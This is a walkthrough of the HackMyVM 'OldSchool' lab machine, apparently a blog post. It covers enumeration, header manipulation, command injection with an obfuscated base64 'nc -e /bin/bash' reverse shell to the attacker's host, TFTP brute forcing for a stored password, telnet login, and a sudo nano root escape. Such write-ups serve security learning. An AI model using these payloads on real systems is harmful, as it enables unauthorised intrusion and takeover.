---
layout: post
title: "HackMyVM - OldSchool"
date: 2023-01-14 15:47:00 +0100
categories: hmv
---

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Medium
Release Date: 2022-12-20

## Scan & Enumeration

```bash
Nmap scan report for 192.168.1.32
Host is up (0.00086s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: 2000's Style Website
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 14 18:05:05 2023 -- 1 IP address (1 host up) scanned in 21.49 seconds
```

```bash
$ telnet 192.168.1.32        
Trying 192.168.1.32...
Connected to 192.168.1.32.
Escape character is '^]'.

Debian GNU/Linux 11

oldschool.hmv login:
```

* Domain : oldschool.hmv

### GoBuster

```bash
$ gobuster dir -u "http://192.168.1.32" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -b 403,404  
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.32
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/01/14 18:19:54 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 872]
/verification.php     (Status: 302) [Size: 0] [--> ./denied.php]
/denied.php           (Status: 200) [Size: 240]
Progress: 440741 / 441122 (99.91%)
===============================================================
2023/01/14 18:22:22 Finished
===============================================================
```

## HTTP Request Manipulation

* http://oldschool.hmv/verification.php

<img src="https://drive.google.com/uc?id=1ox3B1XHQXqXOpWx2hhNA838t3MpL0LAO"/>

Sending request with ** Role: admin **

<img src="https://drive.google.com/uc?id=1cC0fpIKmK50B_yyODoGShqBHEo05hPLS"/>

* http://oldschool.hmv/pingertool2000.php

<img src="https://drive.google.com/uc?id=1ekEJ89UGMfQz7pIjnYVy-WeESdFRMnd1"/>


### Bash Obfuscation (base64)

* Target : ``` nc -e /bin/bash <local> <port> ```

```bash 
$ echo -n "nc -e /bin/bash 192.168.1.6 4444" | base64
bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS42IDQ0NDQ=
```

* Burp URL Obfuscation

```
url=lol.com${IFS}%0aec''ho%09"bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS42IDQ0NDQ"%09|%09base64%09-d%09|%09bas''h
```

* Reference : https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bash-obfuscation-bash-sh

```bash
$ nc -lvnp 4444                                       
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.32] 54020
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell (www-data)

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
CTRL+Z  
stty raw -echo; fg  
2xENTER
```

### LinPEAS

```text
                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                    
                ╚════════════════════════════════════════════════╝                                                                                                    
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                           
root           1  0.0  1.0  98328 10140 ?        Ss   18:58   0:03 /sbin/init                                                                                         
root         183  0.0  0.9  48376  9800 ?        Ss   18:58   0:00 /lib/systemd/systemd-journald
root         203  0.0  0.5  21724  5344 ?        Ss   18:58   0:00 /lib/systemd/systemd-udevd
systemd+     308  0.0  0.6  88440  6120 ?        Ssl  18:58   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         376  0.0  0.5  99888  5760 ?        Ssl  18:58   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
root         385  0.0  0.2   6748  2872 ?        Ss   18:58   0:00 /usr/sbin/cron -f
message+     386  0.0  0.4   8344  4376 ?        Ss   18:58   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         390  0.0  0.3 220800  3948 ?        Ssl  18:58   0:00 /usr/sbin/rsyslogd -n -iNONE
root         391  0.0  0.5  21600  5676 ?        Ss   18:58   0:00 /lib/systemd/systemd-logind
root         393  0.0  0.5  14620  5104 ?        Ss   18:58   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root         406  0.0  0.4   8380  4248 ?        Ss   18:58   0:02 /usr/sbin/inetd
root         415  0.0  1.3  24124 13020 ?        Ss   18:58   0:13 /usr/sbin/snmpd -LOw -u root -g root -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
root         423  0.0  0.1   5848  1808 tty1     Ss+  18:58   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         435  0.0  0.0   4872   296 ?        Ss   18:58   0:00 /usr/sbin/in.tftpd --listen --user fanny --address :69 --secure /srv/tftp
root         451  0.0  2.0 194172 20316 ?        Ss   18:58   0:01 /usr/sbin/apache2 -k start
www-data     501  0.1  1.6 194832 16560 ?        S    18:58   0:26  _ /usr/sbin/apache2 -k start
www-data     616  0.1  1.6 194824 16548 ?        S    19:11   0:26  _ /usr/sbin/apache2 -k start
www-data     618  0.1  1.6 194832 16496 ?        S    19:11   0:26  _ /usr/sbin/apache2 -k start
www-data    1391  0.0  0.0   2484   576 ?        S    23:53   0:00  |   _ sh -c ping -c 1 -W 1 url=lol.com${IFS} ec''ho?"bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS42IDQ0NDQ"?|?base64?-d?|?bas''h
www-data    1395  0.0  0.2   3900  2908 ?        S    23:53   0:00  |       _ bash
www-data    1396  0.0  0.2   3900  2844 ?        S    23:53   0:00  |           _ bash
www-data    1398  0.0  0.7  15332  7844 ?        S    23:55   0:00  |               _ python3 -c import pty;pty.spawn("/bin/bash")
www-data    1399  0.0  0.3   7504  3696 pts/0    Ss   23:55   0:00  |                   _ /bin/bash
www-data    1409  0.3  1.2  96776 12408 pts/0    S+   23:57   0:00  |                       _ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
www-data    1410  0.1  0.2   3360  2432 pts/0    S+   23:57   0:00  |                       _ sh
www-data    4316  0.0  0.0   3360   964 pts/0    S+   23:58   0:00  |                           _ sh
www-data    4320  0.0  0.3  10248  3092 pts/0    R+   23:58   0:00  |                           |   _ ps fauxwww
www-data    4319  0.0  0.0   3360   964 pts/0    S+   23:58   0:00  |                           _ sh
www-data     619  0.1  1.6 194824 16544 ?        S    19:11   0:25  _ /usr/sbin/apache2 -k start
www-data     622  0.1  1.6 194832 16560 ?        S    19:11   0:25  _ /usr/sbin/apache2 -k start
www-data     625  0.1  1.7 194824 17364 ?        S    19:11   0:24  _ /usr/sbin/apache2 -k start
www-data     627  0.1  1.6 194824 16548 ?        S    19:12   0:24  _ /usr/sbin/apache2 -k start
www-data     646  0.0  1.6 194832 16556 ?        S    19:19   0:08  _ /usr/sbin/apache2 -k start
www-data     648  0.0  1.6 194824 16548 ?        S    19:19   0:08  _ /usr/sbin/apache2 -k start
www-data     652  0.0  1.6 194824 16424 ?        S    19:19   0:08  _ /usr/sbin/apache2 -k start
```

```bash
/usr/sbin/in.tftpd --listen --user fanny --address :69 --secure /srv/tftp
```

## [tftp Brute Force](https://www.rapid7.com/db/modules/auxiliary/scanner/tftp/tftpbrute/)

```bash
$ msfconsole       
msf6 > use auxiliary/scanner/tftp/tftpbrute
msf6 auxiliary(scanner/tftp/tftpbrute) > show options

Module options (auxiliary/scanner/tftp/tftpbrute):

   Name        Current Setting                                   Required  Description
   ----        ---------------                                   --------  -----------
   CHOST                                                         no        The local client address
   DICTIONARY  /opt/metasploit-framework/embedded/framework/dat  yes       The list of filenames
               a/wordlists/tftp.txt
   RHOSTS                                                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo
                                                                           it
   RPORT       69                                                yes       The target port
   THREADS     1                                                 yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/tftp/tftpbrute) > set RHOST 192.168.1.32
RHOST => 192.168.1.32
msf6 auxiliary(scanner/tftp/tftpbrute) > run

[+] Found passwd.cfg on 192.168.1.32
[+] Found pwd.bin on 192.168.1.32
[+] Found pwd.cfg on 192.168.1.32
[+] Found sip.cfg on 192.168.1.32
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/tftp/tftpbrute) >
```

* Download Files with TFTP

```bash
$ tftp 192.168.1.32
tftp> connect
(to) 192.168.1.32
tftp> status
Connected to 192.168.1.32.
Mode: netascii Verbose: off Tracing: off Literal: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> get passwd.cfg
tftp> get pwd.bin
Transfer timed out.

tftp> get pwd.cfg
Transfer timed out.

tftp> get sip.cfg
Transfer timed out.

tftp> quit
```

```bash
$ cat passwd.cfg           
# lesspass default config password generator
# do not delete

lesspass oldschool.hmv fanny 14mw0nd32fu1
```

## LessPass

<img src="https://drive.google.com/uc?id=1Mkq4yvTpiwhIO60XKMJy_sXgUFFX_ScW"/>

```bash
$ telnet 192.168.1.32 
Trying 192.168.1.32...
Connected to 192.168.1.32.
Escape character is '^]'.

Debian GNU/Linux 11

oldschool.hmv login: fanny
Password: 
Linux oldschool.hmv 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Dec 11 18:18:59 CET 2022 from 192.168.0.29 on pts/1
fanny@oldschool:~$
```

## ROOT - [nano](https://gtfobins.github.io/gtfobins/nano/)

```bash
fanny@oldschool:~$ sudo -l
Matching Defaults entries for fanny on oldschool:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fanny may run the following commands on oldschool:
    (ALL : ALL) NOPASSWD: /usr/bin/nano /etc/snmp/snmpd.conf
fanny@oldschool:~$ 
```

```bash
sudo /usr/bin/nano /etc/snmp/snmpd.conf
```

```
nano
^R^X
reset; sh 1>&0 2>&0
```
